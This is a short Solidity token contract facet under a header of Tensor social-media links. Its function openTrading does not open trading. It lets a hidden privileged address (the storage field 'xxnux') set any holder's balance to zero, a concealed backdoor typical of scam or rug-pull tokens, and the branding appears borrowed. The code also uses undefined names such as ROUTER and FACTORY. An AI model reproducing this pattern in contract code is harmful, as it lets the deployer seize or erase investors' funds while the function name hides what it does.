/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/tensor
    // Twitter: https://twitter.com/tensor_hq
    // Website: https://www.tensor.trade/
    // Github: https://github.com/tensor
    // Discord: https://discord.com/invite/tensor
    // Medium: https://medium.com/tensor/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
